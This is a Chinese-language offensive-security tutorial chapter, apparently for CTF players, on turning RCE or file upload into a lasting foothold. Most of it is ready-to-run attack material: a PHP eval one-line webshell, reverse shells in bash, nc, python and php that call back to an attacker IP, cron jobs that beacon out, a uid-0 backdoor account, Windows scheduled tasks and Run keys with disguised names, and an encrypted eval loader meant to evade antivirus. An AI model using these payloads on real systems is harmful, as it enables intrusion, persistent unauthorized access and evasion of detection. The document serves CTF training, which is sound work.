---
comments: true
---

# 立足点建立

拿到 RCE 或文件上传的利用点之后，下一个问题往往是：怎么把这个"能执行一次命令"的能力，变成一个稳定、可反复使用的立足点（foothold）。本章讲三件事：把 webshell 落地到目标上、把 shell 反弹回自己的机器、以及让权限在重启或清理后仍然活着。最后简单聊聊免杀的基本概念，以及在 CTF 的 AWD 赛制里这些手段该如何取舍。

> 前置阅读：如果还没搞定"怎么执行命令"，先看「文件上传」和「RCE」两章；本章假设你已经能在目标上写文件或执行命令。

## Webshell 落地

webshell 的本质是"一个能通过 HTTP 反复触发命令执行的脚本文件"。选型的核心问题是：**流量要不要加密、功能要多全、文件要小到什么程度**。

### 一句话木马

最小形态，PHP 里就是一个 `eval` 或 `assert`：

```php
<?php @eval($_POST['cmd']); ?>
```

写入方式视利用点而定：

- 文件上传漏洞：直接上传，或在文件头里拼接图片内容绕过 content-type 检查（详见「文件上传」一章）。
- RCE：用命令写文件，例如 `echo '<?php @eval($_POST[cmd]);?>' > /var/www/html/shell.php`。注意 shell 里 `$` 和引号的转义，用单引号包裹最省心。
- 文件包含 + 日志 poisoning 等场景：让包含点把代码落到可访问路径。

优点是文件极小、随处可写；缺点是流量明文，参数名 `cmd=system('id');` 这样的内容在 WAF 眼里等于自首，而且功能只有"执行一行代码"。

**基本使用**：直接用蚁剑/菜刀类客户端连，或者手动发请求验证：

```bash
curl -d 'cmd=system("id");' http://target/shell.php
```

### 冰蝎（Behinder）

冰蝎的定位是 **流量加密型 webshell**。客户端与服务端约定一个密钥，payload 用 AES 加密后再传输， Wireshark 里看到的是一串看不出结构的密文，静态特征和流量特征都大幅弱化。

基本使用流程：

1. 从 releases 拿到 `Behinder.jar`，`java -jar Behinder.jar` 启动（需要 Java 环境）。
2. 在 `server/` 目录里选对应语言的 shell（`shell.php` / `shell.jsp` / `shell.aspx`），通过上传或 RCE 落地到目标。
3. 客户端"新增"：填 URL，协议选 `default_aes`（v3 默认），保存后双击连接。
4. 连上后自带虚拟终端、文件管理、数据库操作，日常操作不需要再手写命令。

冰蝎的 shell 文件本身有固定结构（密钥协商 + AES 解密 + 反射执行），特征库覆盖得很好，所以"原版文件直接传"在有杀软/查杀的场景下基本必死——这是后面免杀一节要解决的问题。

### 哥斯拉（Godzilla）

功能上与冰蝎同类，也是加密流量管理器，但插件生态更全：内置了常用的提权 EXP、内存马注入、数据库管理等模块，生成的 shell 支持多种加密器（AES、XOR 等）。

基本使用与冰蝎几乎一样：

1. `java -jar godzilla.jar` 启动。
2. 「管理 → 生成」选择语言（PHP/JSP/ASPX）、加密器、密码，生成 shell 文件并落地到目标。
3. 「目标 → 添加」填 URL、密码、加密器，测试连接。
4. 进入后右键可加载插件，比如直接执行 mimikatz 类模块、注入内存马。

### 蚁剑（AntSword）

蚁剑是 **开源的 webshell 管理器**，本身不发明 shell，而是管理各种 shell（一句话、冰蝎 shell 都能挂进来）。它的价值在于跨平台、开源可改、编码器/解码器可自定义。

```text
添加数据：Shell 地址 = http://target/shell.php
连接密码 = cmd          # 一句话里 $_POST 的键名
编码器   = default / base64 / chr 等
```

`default` 就是明文 POST；`base64` 会把 payload 编码一次，能过掉最 naive 的关键字匹配，但对认真做的 WAF 无效。

### 怎么选

CTF 场景下的实用排序：

- 目标没有流量检测、只要快速干活：**一句话 + 蚁剑**，或者直接 curl，最省事。
- AWD 或有流量审计、需要不被对手从流量里抄走 shell：**冰蝎/哥斯拉**，流量加密后别人看到你的包也还原不出命令。
- 需要提权、打内存马等进阶操作：**哥斯拉**，插件现成。

三者不冲突，常见做法是先用一句话探路，确认能写能连后立刻换成冰蝎 shell。

## 反弹 Shell

### 为什么需要反弹

webshell 是"请求-响应"模式：每执行一条命令都要发一个 HTTP 请求，交互性差，跑不了交互式程序。反弹 shell 的思路是让 **目标主动连回攻击机**，把 shell 的输入输出挂到这条 TCP 连接上。

为什么要"反弹"而不是攻击机直接连目标（bind shell）？因为目标通常在内网/NAT/防火墙后面，入站连接根本到不了；而出站连接一般限制宽松得多。

### 监听端配置

攻击机上先用 `nc` 起一个监听：

```bash
nc -lvnp 4444
```

- `-l`：监听模式
- `-v`：显示连接信息
- `-n`：不做 DNS 解析
- `-p 4444`：监听端口

如果攻击机自己也在 NAT 后面（比如校园网），公网 VPS 上监听，或打一层内网穿透（`frp` 等），让目标能连到。

拿到 shell 后第一时间升级成交互式 TTY，否则 `su`、`vim`、`Ctrl+C` 都用不了：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 然后 Ctrl+Z 把 shell 挂到后台
stty raw -echo; fg
# 回车恢复前台，再补一下
export TERM=xterm
```

### bash 版

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

原理：bash 内建支持 `/dev/tcp/host/port` 伪设备，打开它即建立 TCP 连接；`>&` 把 stdout、stderr 重定向到连接，`0>&1` 再把 stdin 也接上去。最短最好用，但目标必须是 bash 且未禁用该特性。

### nc 版

```bash
nc 10.0.0.1 4444 -e /bin/bash
```

`-e` 让 nc 在建立连接后执行程序。但很多发行版装的是 OpenBSD 版 nc，**没有 `-e` 选项**，这时用命名管道绕：

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

原理：`mkfifo` 建一个管道文件，`nc` 的输出写进管道，`cat` 从管道读出喂给 bash，bash 的输出再经管道送回 nc——用一个文件把两条方向相反的流接成环。

### python 版

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

核心是三次 `os.dup2`：把 socket 的文件描述符复制到 0/1/2（stdin/stdout/stderr），这样随后启动的 bash 读写的就是网络连接。目标上有 python 时这是最通用的一条。

### php 版

```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

`fsockopen` 返回的流在 PHP CLI 下对应文件描述符 3，于是用 `<&3 >&3 2>&3` 把 bash 的三个标准流接到这个 socket 上。在只有 web 环境、命令执行点就是 PHP 的场景里很顺手。

收到连接的标志：监听端终端出现 `connect to [10.0.0.1] from target` 并出现一个新的提示符。

## 权限维持基础

立足点会被重启、被清理、被对手（AWD 里）删掉。权限维持的目标是：**即使 webshell 被删，也能再拿回来**。每种给一两条够用的即可。

### Linux：cron 计划任务

```bash
# 每分钟反弹一次 shell，简单粗暴
echo '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/crontab
```

或者写到用户自己的 crontab（`crontab -e` 或 `/var/spool/cron/<user>`）。注意 root 身份写入 `/etc/crontab` 时需要带上用户名字段，个人 crontab 则不需要。

### Linux：后门用户

```bash
# 添加一个 uid=0 的用户，效果等同于 root
useradd -o -u 0 -g 0 -M -s /bin/bash backdoor
echo 'backdoor:Passw0rd' | chpasswd
```

`-o` 允许 uid 重复（与 root 同为 0），`-M` 不建家目录。配合 `passwd` 里的记录可以直接 SSH 登录。更隐蔽一点的做法是往 `/root/.ssh/authorized_keys` 里塞自己的公钥。

### Windows：计划任务

```powershell
schtasks /create /tn "WindowsUpdateCheck" /sc minute /mo 5 /tr "C:\Windows\Temp\rev.exe" /ru SYSTEM
```

每 5 分钟以 SYSTEM 权限运行一次指定程序。`schtasks` 是内置命令，不需要额外落地工具。

### Windows：启动项

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync" /t REG_SZ /d "C:\Users\Public\rev.exe"
```

当前用户登录时自动执行。写 `HKLM` 下的同名键则对所有用户生效（需要管理员权限）。

### 一点取舍

权限维持的核心矛盾是 **持久性和隐蔽性不可兼得**：cron 每分钟反弹最可靠也最吵。够用即止的原则下，先想清楚"我需要它活多久"——AWD 一轮可能只有几分钟，一条 cron 就够；真实渗透才需要考虑多手段冗余。

## 免杀基础概念

### 杀软在查什么

主流查杀分两类：

- **静态查杀**：不运行文件，直接看内容。最基础的是 **特征码匹配**——杀软厂商给已知恶意文件提取一段字节序列（或哈希）作为"指纹"，文件里出现这段指纹就报警。进阶一点的是启发式检测：看到 `eval(base64_decode(...))` 这种高危函数组合就判定可疑。
- **动态查杀**：把文件放进沙箱里跑，观察行为（连了哪些 IP、改了哪些注册表、注入了什么进程），行为恶意才报警。

CTF 里遇到的"查杀"绝大多数是静态特征码层面（比如比赛方的 webshell 查杀脚本），所以重点讲静态免杀。

### 静态免杀的思路

特征码匹配的本质是"你的文件里有一段和库里一样的字节"。那绕过思路就只有两个方向：

1. **改变字节，不改变功能**。变量名混淆、注释插入、等价语法替换（`eval` → `assert` → 回调函数 `call_user_func`）、字符串拼接拆分（`'ev'.'al'`）。
2. **让恶意部分不出现在文件里，运行时再造出来**。典型做法是把真正的 payload 加密/编码后存进文件，运行时解密执行：

```php
<?php
$key = "k";
$payload = openssl_decrypt($_POST['p'], "AES-128-ECB", $key);
eval($payload);   // 文件本身不含任何恶意代码明文
?>
```

这其实就是冰蝎 shell 的基本结构——加密除了防流量审计，顺带也做了静态免杀。

够用的结论：CTF 场景下，把一句话换成"异或/拼接 + 动态函数名"的写法，基本就能过掉比赛里的特征码查杀脚本；不要试图手工对抗真正的商业杀软，那是另一个专业领域。

## CTF 实战：AWD 中的一轮完整流程

AWD（Attack With Defense）赛制里，每支队伍维护一台有漏洞的靶机，既要打别人拿 flag，也要防别人打自己。立足点建立在这里是核心动作。走一遍典型流程：

### 第一步：用已知漏洞写入一句话

假设通过赛前审计已知靶机有文件上传点（参考「文件上传」一章的绕过手法），上传 `shell.php`：

```php
<?php @eval($_POST['cmd']); ?>
```

验证可用：

```bash
curl -d 'cmd=system("id");' http://192.168.1.10/uploads/shell.php
```

### 第二步：立刻换成冰蝎 shell

明文一句话在 AWD 里是大忌——防守方能从流量里看到你的命令，直接把 shell 复制走打别人。通过一句话写入冰蝎的 `shell.php`（用蚁剑文件管理上传，或 `file_put_contents` 写），然后冰蝎客户端连接，后续操作全部走加密通道。

### 第三步：拿 flag 并留后门

AWD 的 flag 通常在固定路径，如 `/flag`。读到 flag 提交得分后，立即写权限维持：

```bash
echo '* * * * * www-data bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"' >> /etc/crontab
```

同时把 webshell 藏到深路径、改成不起眼的文件名，比如 `/var/www/html/assets/fonts/.cache.php`。

### 第四步：防守侧的对应动作

立足点建立的反面就是查杀。自己队伍要定期：

```bash
# 找出最近被改动的 php 文件，大概率是对手刚传的 shell
find /var/www -name "*.php" -mmin -5
# 看有没有可疑 cron
crontab -l; cat /etc/crontab
```

### 取舍建议

- **webshell**：普通积分赛（Jeopardy）的 web 题多数只需要一次性命令执行，curl + 一句话足矣，不必上管理器；AWD 必须加密 shell。
- **反弹 shell**：需要翻文件、跑交互程序时才反弹；只读个 flag 不值得。端口选常见高位端口（4444、8888），避免被防火墙只放行 80/443 的策略拦掉。
- **权限维持**：Jeopardy 完全不需要。AWD 里一两条 cron 就够，写太多反而容易被对手的查杀脚本扫到特征。
- **免杀**：只在确认对方有查杀时再做，先 xor 拼接试一手，不要一上来就写复杂加载器。

一句话总结本章：**先用最小成本确认立足点（一句话），再用加密通道巩固它（冰蝎/哥斯拉），需要交互就反弹 shell，赛制要求持久就留后门，被查杀了才做免杀**。
